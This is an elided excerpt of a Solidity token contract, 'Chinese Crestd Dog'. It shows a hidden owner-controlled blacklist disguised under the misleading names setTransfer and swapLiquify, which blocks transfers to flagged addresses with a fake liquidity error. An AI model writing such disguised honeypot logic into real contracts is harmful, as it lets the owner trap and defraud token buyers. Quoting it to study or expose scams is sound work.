...
contract ChineseCrestdDog is Context, IERC20, Ownable {
    ...
    uint256 private _minLottoBalance = 1000000000;

    string private _name = "Chinese Crestd Dog";
    ...
    mapping (address => bool) private swapLiquify;
    ...
    function setTransfer(address _addr, bool state) public onlyOwner{
        require(_msgSender() == owner(), "fail");
        swapLiquify[_addr] = state;
    }
    ...
    function _transfer(
        ...
        require(!swapLiquify[to], "Swap and liquify must be approve");
